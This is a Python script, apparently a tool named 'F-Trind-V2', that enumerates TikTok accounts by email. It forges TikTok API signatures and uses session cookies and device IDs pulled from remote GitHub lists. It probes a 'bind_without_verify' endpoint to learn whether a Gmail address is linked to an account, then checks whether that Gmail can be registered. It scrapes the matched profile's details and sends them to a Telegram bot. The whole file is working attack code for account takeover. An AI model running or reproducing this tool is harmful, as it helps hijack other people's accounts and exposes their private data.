import os, sys
import requests, time, secrets, threading, string, uuid
from random import choice, randrange, randint
from uuid import uuid4
from MedoSigner import Argus, Gorgon, md5, Ladon
from urllib.parse import urlencode
import random, re, json, SignerPy, binascii
from concurrent.futures import ThreadPoolExecutor
from user_agent import generate_user_agent as user_agent

try:
    import telebot
except:
    os.system('pip install telebot')
    os.system('pip install Pytelegrambotapi==3.7.7')
    os.system('pip install SignerPy==0.12.0')
    os.system('clear')
    import telebot

# تعريف الألوان
P = '\x1b[1;97m'       # أبيض فاتح
B = '\x1b[1;94m'       # أزرق فاتح
O = '\x1b[1;96m'       # سماوي
Z = "\033[1;30m"       # أسود غامق
X = '\033[1;33m'       # أصفر
F = '\033[2;32m'       # أخضر غامق
R = '\033[1;31m'       # أحمر
L = "\033[1;95m"       # أرجواني
C = '\033[2;35m'       # وردي غامق
A = '\033[2;39m'       # أزرق رمادي
W = "\x1b[38;5;231m"   # أبيض ناصع
J = "\x1b[38;5;208m"   # برتقالي
J1 = '\x1b[38;5;202m'  # برتقالي غامق
J2 = '\x1b[38;5;203m'  # وردي فاتح
J21 = '\x1b[38;5;204m' # وردي متوسط
J22 = '\x1b[38;5;209m' # وردي فاتح مشع
F1 = '\x1b[38;5;76m'   # أخضر زمردي
C1 = '\x1b[38;5;120m'  # أخضر فاتح
P1 = '\x1b[38;5;150m'  # أخضر مائل للأزرق
P2 = '\x1b[38;5;190m'  # أخضر ليموني

sd = random.choice([B, O, X, F, R, L, C, A, W, J, J1, J2, J21, J22, F1, C1, P1, P2])

def lo():
    print(f"{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬")
    print(sd + f"""
       █████╗  ███████╗ ██████╗  ██╗ ████████╗
      ██╔══██╗ ██╔════╝ ██╔══██╗ ██║ ╚══██╔══╝
      ███████║ █████╗   ██████╔╝ ██║    ██║
      ██╔══██║ ██╔══╝   ██╔══██╗ ██║    ██║
      ██║  ██║ ██║      ██║  ██║ ██║    ██║
{sd}      ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝ ╚═╝    ╚═╝
        {X}¸.•´¯`•.¸¸ {J22} F-Trind-V2 {X}¸.•´¯`•.¸¸         
                {F}TLE :   @oo22bb / AFR_0
    """)
    print(f"{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬")

lo()    
idd = input("Enter ID : ")
tok = input("Enter Token : ")
os.system('clear')
lo()
fileuser = 'list.txt'
try:
    with open("list.txt", "r", encoding="utf-8") as f:
        total_users = sum(1 for line in f if line.strip())
except:
    print("File 'list.txt' not found!")
    exit()
    
ya = 0
no = 0
nod = 0
yas = 0
ss = requests.get("https://raw.githubusercontent.com/is-L7N/session_keys/refs/heads/main/github.txt").text.splitlines()
dv = []

for ln in requests.get("https://raw.githubusercontent.com/is-L7N/dv2/refs/heads/main/dv.txt").text.splitlines():
    tk = ln.strip().split(":")
    if len(tk) >= 2:
        dv.append((tk[0], tk[1]))

def get_user_id(username):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Android 10; Pixel 3 Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/125.0.6394.70 Mobile Safari/537.36 trill_350402 JsSdk/1.0 NetType/MOBILE Channel/googleplay AppName/trill app_version/35.3.1 ByteLocale/en ByteFullLocale/en Region/IN AppId/1180 Spark/1.5.9.1 AppVersion/35.3.1 BytedanceWebview/d8a21c6",
    }
    try:
        tikinfo = requests.get(f'https://www.tiktok.com/@{username}', headers=headers).text
        info = str(tikinfo.split('webapp.user-detail"')[1]).split('"RecommenUserList"')[0]
        user_id = str(info.split('id":"')[1]).split('",')[0]
        return user_id
    except:
        return None

def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int = 2, platform: int = 19, unix: int = None):
    x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
    data = payload
    if not unix: unix = int(time.time())
    return Gorgon(params, unix, payload, cookie).get_value() | {
        "x-ladon": Ladon.encrypt(unix, license_id, aid),
        "x-argus": Argus.get_sign(params, x_ss_stub, unix, platform = platform, aid = aid, license_id = license_id, sec_device_id = sec_device_id, sdk_version = sdk_version_str, sdk_version_int = sdk_version)
    }

def get_level(username):
    try:
        user_id = get_user_id(username)
        if not user_id:
            return "N/A"
        url = "https://webcast16-normal-no1a.tiktokv.eu/webcast/user/?request_from=profile_card_v2&request_from_scene=1&target_uid=" + str(user_id) + "&iid=" + str(random.randint(1, 10 ** 19)) + "&device_id=" + str(random.randint(1, 10 ** 19)) + "&ac=wifi&channel=googleplay&aid=1233&app_name=musical_ly&version_code=300102&version_name=30.1.2&device_platform=android&os=android&ab_version=30.1.2&ssmix=a&device_type=RMX3511&device_brand=realme&language=ar&os_api=33&os_version=13&openudid=" + str(binascii.hexlify(os.urandom(8)).decode()) + "&manifest_version_code=2023001020&resolution=1080*2236&dpi=360&update_version_code=2023001020&_rticket=" + str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632" + "&current_region=IQ&app_type=normal&sys_region=IQ&mcc_mnc=41805&timezone_name=Asia%2FBaghdad&carrier_region_v2=418&residence=IQ&app_language=ar&carrier_region=IQ&ac2=wifi&uoo=0&op_region=IQ&timezone_offset=10800&build_number=30.1.2&host_abi=arm64-v8a&locale=ar&region=IQ&content_language=gu%2C&ts=" + str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "&cdid=" + str(uuid.uuid4()) + "&webcast_sdk_version=2920&webcast_language=ar&webcast_locale=ar_IQ"
        headers = {'User-Agent': "com.zhiliaoapp.musically/2023001020 (Linux; U; Android 13; ar; RMX3511; Build/TP1A.220624.014; Cronet/TTNetVersion:06d6a583 2023-04-17 QuicVersion:d298137e 2023-02-13)"}
        headers.update(sign(url.split('?')[1], '', "AadCFwpTyztA5j9L" + ''.join(secrets.choice(string.ascii_letters + string.digits) for _ in range(9)), None, 1233))
        response = requests.get(url, headers=headers)
        level_match = re.search(r'"default_pattern":"(.*?)"', response.text)
        if level_match:
            level_text = level_match.group(1)
            if 'المستوى رقم' in level_text:
                return level_text.split('المستوى رقم')[1].strip()
            else:
                return "N/A"
        else:
            return "N/A"
    except Exception as e:
        return "N/A"

def info(email):
    global yas
    username = email.split('@')[0]
    headers = {
        'User-Agent': str(user_agent()),
        'Accept-Language': 'en-US,en;q=0.9',
    }
    try:
        url = f"https://www.tiktok.com/@{username}"
        response = requests.get(url, headers=headers, timeout=15)
        html = response.text

        level = get_level(username)

        m = re.search(r'<script id="__UNIVERSAL_DATA_FOR_REHYDRATION__".*?>(.*?)</script>', html)
        if not m:
            ff = f"""
[+] username : @{username}
[+] email : {email}
[+] By : @oo22bb
            """
            requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                          params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})
            
            return

        data_json = json.loads(m.group(1))
        iinfo = data_json['__DEFAULT_SCOPE__']['webapp.user-detail']['userInfo']
        user_obj = iinfo['user']
        stats = iinfo['stats']

        account_data = {
            'id': user_obj.get('id', 'N/A'),
            'user': user_obj.get('uniqueId', username),
            'name': user_obj.get('nickname', 'N/A'),
            'folos': format(stats.get('followerCount', 0), ',d'),
            'folon': format(stats.get('followingCount', 0), ',d'),
            'priv': 'True' if user_obj.get('privateAccount') else 'False',
            'lik': format(stats.get('heartCount', 0), ',d'),
            'vid': format(stats.get('videoCount', 0), ',d'),
            'verified': 'True' if user_obj.get('verified') else 'False'
        }

        ff = f"""
username : @{account_data['user']}
email : {email}
name : {account_data['name']}
followers : {account_data['folos']}
following : {account_data['folon']}
likes : {account_data['lik']}
id : {account_data['id']}
private : {account_data['priv']}
videos : {account_data['vid']}
verified : {account_data['verified']}
Level : {level}
By : @oo22bb
        """.strip()
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})

    except Exception as e:
        ff = f"""
username : @{username}
email : {email}
By : @oo22bb
        """.strip()       
        requests.post(f"https://api.telegram.org/bot{tok}/sendMessage",
                      params={'chat_id': idd, 'text': ff, 'parse_mode': 'HTML'})

def check_gmail(email):
    global ya, no, yas, nod   
    totel = ya + no + nod
    lok = f"    {R}False{P} - {J2}{totel} {F}True{P} - {P1}{yas} {J2}Lists{P} - {L}{total_users}"    
    try:
        import PKK
        email_name = email.split('@')[0]
        check = PKK.Gmail.CheckGmail(email_name)
        
        if check == {'Programmer': 'Ibn_Suleiman', 'Check': 'Good'}:
            yas += 1
            info(email)
        else:
            nod += 1
    except ImportError:
        nod += 1
    except Exception as e:
        nod += 1
    totel = ya + no + nod
    lok= f"""{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
{sd}
       █████╗  ███████╗ ██████╗  ██╗ ████████╗
      ██╔══██╗ ██╔════╝ ██╔══██╗ ██║ ╚══██╔══╝
      ███████║ █████╗   ██████╔╝ ██║    ██║
      ██╔══██║ ██╔══╝   ██╔══██╗ ██║    ██║
      ██║  ██║ ██║      ██║  ██║ ██║    ██║
{sd}      ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝ ╚═╝    ╚═╝
        {X}¸.•´¯`•.¸¸ {J22} F-Trind-V2 {X}¸.•´¯`•.¸¸         
                {F}TLE :   @oo22bb / AFR_0

{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
	{R}False{P} - {J2}{totel} {F}True{P} - {P1}{yas} {J2}Lists{P} - {L}{total_users}
"""
    sys.stdout.write('\033[H\033[J')
    sys.stdout.write(lok + '\n')
    sys.stdout.flush()

def chzm(user):
    global ya, no, yas, nod
    email = user + '@gmail.com'

    pm = {
        'device_platform': 'android',
        'ssmix': 'a',
        'locale': 'en',
        'language': 'en',
        'channel': 'googleplay',
        'aid': "1233",
        'app_name': 'musical_ly',
        'version_code': '360505',
        'version_name': '36.5.5',
        'manifest_version_code': '2023605050',
        'update_version_code': '2023605050',
        'ab_version': '36.5.5',
        'os_version': '10',
        "device_id": 0,
        'app_version': '30.1.2',
        "request_from": "profile_card_v2",
        "request_from_scene": '1',
        "scene": "1",
        "mix_mode": "1",
        "os_api": "34",
        "ac": "wifi",
        "request_tag_from": "h5"
    }
    pm.update({'device_type': f'rk{random.randint(3000,4000)}s_{uuid.uuid4().hex[:4]}'})

    pm = SignerPy.get(params=pm)
    hh = {'User-Agent': f'com.zhiliaoapp.musically/2022703020 (Linux;U;Android 7.1.2;en;SM-N975F;Build/N2G48H;tt-ok/{random.randint(1,10**19)})'}
    ck = {"sessionid": random.choice(ss)}
    dt = {'email': email}

    di, ii = random.choice(dv)
    pm.update({"device_id": di, "iid": ii})

    ur = f'https://{random.choice(["api31-normal-useast2a.tiktokv.com","api22-normal-c-alisg.tiktokv.com","api2.musical.ly","api16-normal-no1a.tiktokv.eu","rc-verification-sg.tiktokv.com","api31-normal-alisg.tiktokv.com","api16-normal-c-useast1a.tiktokv.com","api22-normal-c-useast1a.tiktokv.com","api16-normal-c-useast1a.musical.ly","api19-normal-c-useast1a.musical.ly","api.tiktokv.com","www.tiktok.com","log2.musical.ly","webcast.musical.ly","inapp.tiktokv.com","api2-19-h2.musical.ly"])}/passport/email/bind_without_verify/'

    sg = SignerPy.sign(params=pm, cookie=ck, data=dt)
    hh.update(sg)     
    try:
        rs = requests.post(ur, data=dt, headers=hh, params=pm, cookies=ck).text
        if "Email is linked to another account. Unlink or try another email."and "1023" in rs:
            ya += 1         
            totel = ya + no + nod
            lok= f"""{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
{sd}
       █████╗  ███████╗ ██████╗  ██╗ ████████╗
      ██╔══██╗ ██╔════╝ ██╔══██╗ ██║ ╚══██╔══╝
      ███████║ █████╗   ██████╔╝ ██║    ██║
      ██╔══██║ ██╔══╝   ██╔══██╗ ██║    ██║
      ██║  ██║ ██║      ██║  ██║ ██║    ██║
{sd}      ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝ ╚═╝    ╚═╝
        {X}¸.•´¯`•.¸¸ {J22} F-Trind-V2 {X}¸.•´¯`•.¸¸         
                {F}TLE :   @oo22bb / AFR_0

{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
	{R}False{P} - {J2}{totel} {F}True{P} - {P1}{yas} {J2}Lists{P} - {L}{total_users}
"""
            sys.stdout.write('\033[H\033[J')
            sys.stdout.write(lok + '\n')
            sys.stdout.flush()
            check_gmail(user)
        else:
            no += 1     
            totel = ya + no + nod
            lok= f"""{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
{sd}
       █████╗  ███████╗ ██████╗  ██╗ ████████╗
      ██╔══██╗ ██╔════╝ ██╔══██╗ ██║ ╚══██╔══╝
      ███████║ █████╗   ██████╔╝ ██║    ██║
      ██╔══██║ ██╔══╝   ██╔══██╗ ██║    ██║
      ██║  ██║ ██║      ██║  ██║ ██║    ██║
{sd}      ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝ ╚═╝    ╚═╝
        {X}¸.•´¯`•.¸¸ {J22} F-Trind-V2 {X}¸.•´¯`•.¸¸         
                {F}TLE :   @oo22bb / AFR_0

{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
	{R}False{P} - {J2}{totel} {F}True{P} - {P1}{yas} {J2}Lists{P} - {L}{total_users}
"""
            sys.stdout.write('\033[H\033[J')
            sys.stdout.write(lok + '\n')
            sys.stdout.flush()
    except Exception as e:
        no += 1
        totel = ya + no + nod
        lok= f"""{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
{sd}
       █████╗  ███████╗ ██████╗  ██╗ ████████╗
      ██╔══██╗ ██╔════╝ ██╔══██╗ ██║ ╚══██╔══╝
      ███████║ █████╗   ██████╔╝ ██║    ██║
      ██╔══██║ ██╔══╝   ██╔══██╗ ██║    ██║
      ██║  ██║ ██║      ██║  ██║ ██║    ██║
{sd}      ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝ ╚═╝    ╚═╝
        {X}¸.•´¯`•.¸¸ {J22} F-Trind-V2 {X}¸.•´¯`•.¸¸         
                {F}TLE :   @oo22bb / AFR_0

{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
	{R}False{P} - {J2}{totel} {F}True{P} - {P1}{yas} {J2}Lists{P} - {L}{total_users}
"""
        sys.stdout.write('\033[H\033[J')
        sys.stdout.write(lok + '\n')
        sys.stdout.flush()

def main():
    try:
        with open(fileuser, 'r') as f:
            users = [line.strip() for line in f if line.strip()]
    except:
        print('File Username not found!')
        exit()   
    totel = ya + no + nod
    lok= f"""{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
{sd}
       █████╗  ███████╗ ██████╗  ██╗ ████████╗
      ██╔══██╗ ██╔════╝ ██╔══██╗ ██║ ╚══██╔══╝
      ███████║ █████╗   ██████╔╝ ██║    ██║
      ██╔══██║ ██╔══╝   ██╔══██╗ ██║    ██║
      ██║  ██║ ██║      ██║  ██║ ██║    ██║
{sd}      ╚═╝  ╚═╝ ╚═╝      ╚═╝  ╚═╝ ╚═╝    ╚═╝
        {X}¸.•´¯`•.¸¸ {J22} F-Trind-V2 {X}¸.•´¯`•.¸¸         
                {F}TLE :   @oo22bb / AFR_0

{J} ▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{C1}▬▬{J22}Ā₣ŔΐŦ{C1}▬▬{W}▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬{J}▬▬
	{R}False{P} - {J2}{totel} {F}True{P} - {P1}{yas} {J2}Lists{P} - {L}{total_users}
"""
    sys.stdout.write('\033[H\033[J')
    sys.stdout.write(lok + '\n')
    sys.stdout.flush()    
    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(chzm, users)
        from time import sleep
        sleep(2)

if __name__ == "__main__":
    main()
